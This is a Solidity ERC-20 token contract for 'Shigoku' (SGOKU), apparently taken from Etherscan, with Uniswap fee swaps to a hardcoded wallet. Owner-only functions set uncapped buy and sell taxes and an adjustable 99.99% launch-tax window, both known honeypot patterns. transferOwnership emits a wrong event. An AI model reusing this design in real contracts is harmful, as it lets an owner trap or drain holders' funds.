/**
 *Submitted for verification at Etherscan.io on 2023-09-06
*/

/*
https://shigoku.io/

https://twitter.com/ShigokuToken

https://t.me/ShigokuToken

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Shigoku is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100000000 * 10**_decimals;
    //burn 60%
    uint256 private constant onePercent = 400000 * 10**_decimals; //1%

    uint256 public maxWalletAmount = _totalSupply / 100 * 2; //2% from total supply / 5% from circulation

    uint256 public buyTax = 2;
    uint256 public sellTax = 2;

    string private constant _name = "Shigoku";
    string private constant _symbol = "SGOKU";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable public tW;
        
    uint256 private launchedAt;
    uint256 private launchDelay = 0;
    bool private launch = false;

    uint256 private constant minSwap = onePercent / 20; //0.05% from circulation
    bool private inSwapAndLiquify;
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
        tW = payable(0x33DF7cAfb30A8A088Fc092d370eABeee13338ee7);

        _isExcludedFromFeeWallet[msg.sender] = true;
        _isExcludedFromFeeWallet[tW] = true;
        _isExcludedFromFeeWallet[address(this)] = true;

        _allowances[owner()][address(uniswapV2Router)] = _totalSupply;
        _balance[owner()] = _totalSupply;
        emit Transfer(address(0), address(owner()), _totalSupply);
    }

    function createLP() external onlyOwner {
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function newDelay(uint256 delay) external onlyOwner {
         launchDelay = delay;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        launch = true;
        launchedAt = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");
        uint256 _tax = 0;
        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
        } else {
            require(launch, "Wait till launch");
            if (block.number < launchedAt + launchDelay) {_tax=99;} else {
                if (from == uniswapV2Pair) {
                    require(balanceOf(to) + amount <= maxWalletAmount);
                    _tax = buyTax;
                } else if (to == uniswapV2Pair) {
                    uint256 tokensToSwap = balanceOf(address(this));
                    if (tokensToSwap > minSwap && !inSwapAndLiquify) {
                        if (tokensToSwap > onePercent) {
                            tokensToSwap = onePercent;
                        }
                        swapTokensForEth(tokensToSwap);
                    }
                    _tax = sellTax;
                } else {
                    _tax = 0;
                }
            }
        }
        uint256 taxTokens;
        if(_tax == 99){
            taxTokens = (amount * 9999) / 10000;
        }else{
            taxTokens = (amount * _tax) / 100;
        }
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;
        _balance[address(this)] = _balance[address(this)] + taxTokens;

        emit Transfer(from, to, transferAmount);
    }

    function removeAllLimits() external onlyOwner {
        maxWalletAmount = _totalSupply;
    }

    function newTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            tW,
            block.timestamp
        );
    }
    function setExcludeWFromLimits(address newWallet, bool exclude) external onlyOwner {
        _isExcludedFromFeeWallet[newWallet] = exclude;
    }

    function sendEthToWwallet() external {
        tW.transfer(address(this).balance);
    }

    receive() external payable {}
}
//NFA